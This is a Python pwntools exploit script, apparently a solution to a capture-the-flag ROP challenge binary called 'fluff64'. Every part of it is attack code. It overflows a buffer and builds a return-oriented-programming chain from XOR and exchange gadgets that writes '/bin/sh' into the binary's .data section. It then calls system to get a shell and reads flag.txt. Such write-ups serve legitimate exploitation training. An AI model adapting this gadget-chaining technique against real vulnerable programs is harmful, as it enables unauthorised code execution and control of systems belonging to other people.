#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *


def sxor(s1, s2):
    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))


def get_section_addr(b, name):
    return b.get_section_by_name(name).header.sh_addr


def set_r11_to_data(rop):
    pop_r14_r12 = 0x000000000040082d                                # pop r14 ; xor r11, r12 ; pop r12 mov r13d, 0x604060
    r11_tmp = 0x68732f6e49462b

    rop.raw(p64(pop_r14_r12) + "B"*8 + p64(data ^ r11_tmp))
    rop.raw(p64(pop_r14_r12) + "B"*8 + p64(data ^ r11_tmp))


def set_r11_to_string(rop, r11):
    pop_r14_r12 = 0x000000000040082d                                # pop r14 ; xor r11, r12 ; pop r12 mov r13d, 0x604060
    key_xor = "B"
    string = list("/bin/sh\x00")

    string[0] = sxor(string[0], key_xor)
    string = string[::-1]
    string = ''.join(string).encode("hex")
    rop.raw(p64(pop_r14_r12) + "B"*8 + p64(int(string, 16) ^ r11))
    rop.raw(p64(pop_r14_r12) + "B"*8 + p64(int(string, 16) ^ r11))


def main():
    global data
    context(arch="amd64", os="linux", endian="little")
    e = ELF("./fluff64")
    rop = ROP([e])

    xchg_pop_r15 = 0x000000000040083b                               # mov edi, 0x601050 ; xchg r11, r10 ; pop r15 ; mov r11d, 0x602050
    pop_r15_pop_r13_pop_r12 = 0x000000000040084c                    # pop r15 ; mov [r10], r11 ; pop r13 ; pop r12 ; xor [r10], r12b
    system = e.plt['system']
    data = get_section_addr(e, '.data')
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

    rop.raw(rop.generatePadding(0,40))
    set_r11_to_string(rop, 0x400416)
    rop.raw(p64(xchg_pop_r15) + "B"*8)
    set_r11_to_data(rop)
    rop.raw(p64(xchg_pop_r15) + "B"*8)
    set_r11_to_string(rop, 0x68732f6e49762b)
    rop.raw(p64(pop_r15_pop_r13_pop_r12) + "B"*24)
    rop.raw(p64(pop_rdi) + p64(data))
    rop.raw(system)


    p = process(['./fluff64'])
    msg = p.recv(timeout=0.1)
    print msg

    p.sendline(str(rop))
    p.sendline("/bin/cat flag.txt")
    msg = p.recvline(timeout=1)
    print msg

    p.close()


if __name__ == "__main__":
    main()
